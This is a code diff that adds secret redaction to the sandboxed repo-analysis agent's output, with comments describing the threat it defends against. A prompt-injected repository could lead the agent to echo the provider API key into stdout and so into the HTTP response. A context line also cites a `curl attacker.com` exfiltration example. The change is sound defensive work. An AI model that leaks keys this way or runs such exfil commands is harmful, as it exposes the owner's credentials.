@@ -17,6 +17,10 @@ Security — network egress is pinned, use a scoped provider key anyway:
     no `curl attacker.com`. The /index-repo sandbox gets `GITHUB_CIDRS` for
     the same reason. Start tight, widen if something legitimate breaks.
 
+    Secondary defense: `_sandbox_run` / `_run_analyze` scrub the provider key
+    value out of stdout/stderr before any response is built. Egress stops
+    network exfil; redaction stops the "echo $KEY in the HTML response" path.
+
     Belt and suspenders: still drop a rate-limited, short-lived, single-
     purpose Google AI Studio key into `looptap-secrets`, not your primary
     Gemini key. Any config that lets an agent read git + call a provider
@@ -140,6 +144,25 @@ def _validate_repo_slug(repo: str) -> str:
     return trimmed
 
 
+def _redact_secrets(text: str, *secrets: str) -> str:
+    """Scrub known secret values from text before it leaves the process.
+
+    The analyze sandbox keeps `bash: allow` (git/rg need a shell) and injects
+    the provider key into the environment. Egress CIDRs stop *network* exfil,
+    but an agent can still `echo $GOOGLE_GENERATIVE_AI_API_KEY` into stdout —
+    and we used to return that stdout to the HTTP caller (CWE-526). Replace
+    every known secret value with a placeholder so a prompt-injected repo
+    can't harvest the key via the response body.
+    """
+    if not text:
+        return text
+    out = text
+    for secret in secrets:
+        if secret:
+            out = out.replace(secret, "[REDACTED]")
+    return out
+
+
 def _list_indexed_repos() -> list[dict[str, Any]]:
     """Walk the mounted volume and collect <owner>/<name> entries. Reload
     first so a commit from another container becomes visible without a
@@ -172,7 +195,11 @@ def _run_analyze(file_path: str, as_json: bool) -> tuple[int, str, str]:
     if as_json:
         cmd.append("--json")
     proc = subprocess.run(cmd, env=env, capture_output=True, text=True, timeout=120)
-    return proc.returncode, proc.stdout, proc.stderr
+    return (
+        proc.returncode,
+        _redact_secrets(proc.stdout, key),
+        _redact_secrets(proc.stderr, key),
+    )
 
 
 def _sandbox_run(
@@ -211,7 +238,14 @@ def _sandbox_run(
     )
     try:
         sb.wait()
-        return sb.returncode, sb.stdout.read(), sb.stderr.read()
+        # Redact before the caller turns this into HTMLResponse / error JSON —
+        # bash:allow + env-injected key means stdout is an exfil channel even
+        # when cidr_allowlist blocks the network (Corridor finding 20f04ce0).
+        return (
+            sb.returncode,
+            _redact_secrets(sb.stdout.read(), key),
+            _redact_secrets(sb.stderr.read(), key),
+        )
     finally:
         sb.terminate()
 
